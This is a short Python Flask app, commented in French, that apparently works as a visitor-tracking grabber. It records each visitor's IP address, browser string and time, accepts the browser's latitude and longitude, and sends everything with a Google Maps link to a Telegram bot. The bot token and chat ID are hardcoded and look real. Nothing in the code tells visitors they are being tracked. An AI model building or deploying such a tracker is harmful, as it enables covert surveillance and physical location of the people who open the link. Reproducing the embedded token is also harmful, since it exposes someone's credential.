from flask import Flask, request, render_template, jsonify
import datetime
import requests

app = Flask(__name__)

# Configuration Telegram
TOKEN = "7249761868:AAEDYDMewdHuDCmCCfSZ6uZzj3PxOrtIQxw"
CHAT_ID = "6937350459"

def envoyer_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message
    }
    try:
        requests.post(url, data=data)
    except Exception as e:
        print(f"[ERREUR TELEGRAM] {e}")

@app.route("/")
def accueil():
    ip = request.remote_addr
    navigateur = request.user_agent.string
    date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    message = f"📥 Nouvelle visite détectée :\n" \
              f"🕒 Date : {date}\n" \
              f"🌍 IP : {ip}\n" \
              f"🖥 Navigateur : {navigateur}"

    envoyer_telegram(message)
    return render_template("page.html")

@app.route("/position", methods=["POST"])
def position():
    data = request.get_json()
    latitude = data.get("latitude")
    longitude = data.get("longitude")

    if latitude and longitude:
        message = f"📍 Position approximative reçue :\n" \
                  f"Latitude : {latitude}\n" \
                  f"Longitude : {longitude}\n" \
                  f"https://www.google.com/maps?q={latitude},{longitude}"
        envoyer_telegram(message)

    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(debug=True)
